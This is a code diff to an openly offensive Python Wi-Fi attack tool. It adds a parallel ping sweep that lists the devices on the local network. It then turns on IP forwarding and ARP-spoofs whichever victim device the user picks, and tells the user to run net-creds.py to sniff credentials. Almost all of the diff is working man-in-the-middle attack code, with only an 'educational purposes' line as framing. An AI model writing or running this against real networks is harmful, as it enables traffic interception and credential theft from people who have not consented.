@@ -17,6 +17,7 @@ import network
 import socket
 import fcntl
 import struct
+import multiprocessing
 import netifaces as ni
 from getmac import get_mac_address
 from threading import Lock
@@ -143,6 +144,54 @@ def getHwAddr(ifname):
     info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
     return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
 
+# Function do ping
+def pinger(job_q, results_q):
+    DEVNULL = open(os.devnull, 'w')
+    while True:
+        ip = job_q.get()
+        if ip is None:
+            break
+        try:
+            subprocess.check_call(['ping', '-c1', ip], stdout=DEVNULL)
+            results_q.put(ip)
+        except:
+            pass
+
+# Function maps the network. param pool_size: amount of parallel ping processes. return: list of valid ip addresses
+def map_network(my_ip):
+    pool_size=255
+    ip_list = list()
+
+    # get my IP and compose a base like 192.168.43.xxx
+    ip_parts = my_ip.split('.')
+    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'
+
+    # prepare the jobs queue
+    jobs = multiprocessing.Queue()
+    results = multiprocessing.Queue()
+
+    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
+
+    for p in pool:
+        p.start()
+
+    # cue hte ping processes
+    for i in range(1, 255):
+        jobs.put(base_ip + '{0}'.format(i))
+
+    for p in pool:
+        jobs.put(None)
+
+    for p in pool:
+        p.join()
+
+    # collect he results
+    while not results.empty():
+        ip = results.get()
+        ip_list.append(ip)
+
+    return ip_list
+
 # Function scanning wifi devices and return: your ip, router ip and device ips in network 
 def scanIP(wlan, BSSID):
     # use table to display devices
@@ -154,27 +203,14 @@ def scanIP(wlan, BSSID):
     ROUTER_IP = gws['default'].values()[0][0]
     BTable.add_row([0, ROUTER_IP, BSSID, 'ROUTER'])
     IPs = []
-    devnull = open(os.devnull, 'wb')
-    p = []
-    temp = BASE_IP.split('.')
-    ip_start = temp[0] + '.' + temp[1] + '.' + temp[2]
-    for suffix in range(0,255):
-        ip = ip_start + ".%d" % suffix
-        p.append((ip, subprocess.Popen(['ping', '-c', '3', ip], stdout=devnull)))
+    p = map_network(BASE_IP)
     index = 0
-    while p:
-        for i, (ip, proc) in enumerate(p[:]):
-            if proc.poll() is not None:
-                p.remove((ip, proc))
-                if proc.returncode == 0:
-                    if (ip != BASE_IP and ip != ROUTER_IP and ip != ''):
-                        IPs.append(ip)
-                        index += 1
-                        ip_mac = get_mac_address(ip = ip)
-                        BTable.add_row([str(index), ip, ip_mac, 'DEVICE'])
-                    
-        time.sleep(.04)
-    devnull.close()
+    for (i, ip) in enumerate(p):
+        if (ip != BASE_IP and ip != ROUTER_IP and ip != ''):
+            IPs.append(ip)
+            index += 1
+            ip_mac = get_mac_address(ip = ip)
+            BTable.add_row([str(index), ip, ip_mac, 'DEVICE'])
     print(BTable)
     return BASE_IP, ROUTER_IP, IPs
 
@@ -245,11 +281,13 @@ def connectTONETWORK(ap, wlan):
             command = 'nmcli d wifi connect ' + BSSID.upper()
             os.system(command)
             count_connect -= 1
+            time.sleep(10)
         if (count_connect == 0):
             print(RED + "[-] No network with SSID" + ENDC)
             exit(0)
         else:
             print(GREEN + "[+] Connect to " + str(SSID) + "...\n" + ENDC)
+            time.sleep(5)
             os.system('ifconfig enp0s3 down')
             os.system('ifconfig eth0 down')
             BASE_IP, ROUTER_IP, IPs = scanIP(wlan, BSSID)
@@ -285,7 +323,7 @@ if __name__ == "__main__":
     # Parser of arguments from command line	
     parser = argparse.ArgumentParser(description='[Coded by Shir, Hodaya & Alexey]', epilog="Please use the program for educational purposes.")
     parser.add_argument('-w', action='store', dest='wlan', type = str, help='iface for monitoring')
-    parser.add_argument('-v', action='version', version='%(prog)s 4.1')
+    parser.add_argument('-v', action='version', version='%(prog)s 4.3')
     results = parser.parse_args()
     logos.banner()
     check_root()
@@ -322,11 +360,12 @@ if __name__ == "__main__":
     print(BOLD + "[*] Input the index of the device you want to attack: " + ENDC)	
     ip_choice = input()
     # Check your choose
-    if(type(ip_choice) == type(x) and ip_choice > 0):
-    #if (type(ip_choice) == type(x) and ip_choice < len(IPs) and ip_choice > -1):
+    #if(type(ip_choice) == type(x) and ip_choice > 0):
+    if (type(ip_choice) == type(x) and ip_choice <= len(IPs) and ip_choice > 0):
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
         time.sleep(15)	
-        arp = ARPspoof('wlan0', '192.168.43.18', '192.168.43.1')
+        arp = ARPspoof(str(results.wlan), IPs[ip_choice - 1], ROUTER_IP)
+        #arp = ARPspoof(str(results.wlan), 'TARGET', ROUTER_IP)
         print(BOLD + 'In new terminal run command: python net-creds.py' + ENDC)
         arp.runARP()
     else:		
